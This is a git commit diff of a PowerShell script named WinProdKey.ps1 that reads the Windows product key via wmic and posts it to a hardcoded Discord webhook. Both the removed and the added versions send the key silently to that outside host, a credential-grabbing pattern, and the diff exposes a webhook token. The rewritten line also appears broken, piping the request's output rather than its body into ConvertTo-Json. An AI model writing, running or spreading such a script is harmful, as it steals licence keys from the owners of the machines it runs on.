4e0f3b1b150ad04eeea398dffd9ff35e489cf3dd
NazarHK <nazarburlan2@gmail.com>
2024-12-28 20:12:42 +0100

    Update WinProdKey.ps1

--- WinProdKey.ps1
+++ WinProdKey.ps1
@@ -1,7 +1,4 @@
 $u = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
-$k = (wmic path softwarelicensingservice get OA3xOriginalProductKey | %{$_ -replace '\s', ''}) -join ''
-if ([string]::IsNullOrEmpty($k)) { $k = 'No key' }
-$payload = @{content = $k} | ConvertTo-Json -Depth 1
-try {
-    Invoke-RestMethod -Uri $u -Method Post -Body $payload -ContentType 'Application/Json'
-} catch {}
+$k = (wmic path softwarelicensingservice get OA3xOriginalProductKey | Select-String -Pattern '\w{5}-\w{5}-\w{5}-\w{5}-\w{5}' | foreach { $_.Matches.Value }) -join ''
+$k = [string]::IsNullOrEmpty($k) ? 'No key' : $k
+irm -Uri $u -Method Post -Body @{content=$k} | ConvertTo-Json -Depth 1
